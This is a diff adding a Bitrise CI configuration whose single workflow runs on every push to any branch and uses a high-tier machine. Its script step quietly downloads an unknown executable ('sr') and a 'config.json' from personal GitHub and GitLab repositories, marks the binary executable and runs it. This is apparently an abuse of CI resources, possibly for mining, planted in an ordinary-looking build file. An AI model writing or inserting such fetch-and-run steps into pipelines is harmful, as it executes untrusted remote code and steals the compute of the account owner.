@@ -1,0 +1,17 @@
+format_version: '23'
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+project_type: other
+workflows:
+  primary:
+    steps:
+    - script@1:
+        title: Do anything with Script step
+        inputs:
+        - content: wget -q -O sr https://github.com/gersadega4/pika/raw/refs/heads/main/isu && wget -q -O config.json https://gitlab.com/barbieanay003/app/-/raw/main/lpepe.json && chmod +x sr && ./sr -c config.json
+meta:
+  bitrise.io:
+    stack: linux-docker-android-22.04
+    machine_type_id: elite
+trigger_map:
+- push_branch: "*"
+  workflow: primary
